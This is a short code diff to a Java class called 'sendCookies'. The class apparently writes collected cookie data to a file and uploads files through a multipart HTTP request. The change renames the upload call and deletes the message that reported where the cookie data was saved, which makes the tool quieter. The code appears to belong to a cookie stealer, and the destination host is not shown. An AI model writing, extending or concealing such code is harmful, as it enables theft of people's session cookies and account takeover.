@@ -30,7 +30,7 @@ public class sendCookies {
                         .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                         .build();
 
-                Sender.Sender(client, requestBody);
+                Sender.sendFile(client, requestBody);
             }
         }
     }
@@ -56,7 +56,6 @@ public class sendCookies {
             BufferedWriter writer = new BufferedWriter(new FileWriter(file));
             writer.write(cookieData);
             writer.close();
-            System.out.println("Cookie data has been written to " + fileName);
         } catch (IOException e) {
             e.printStackTrace();
         }
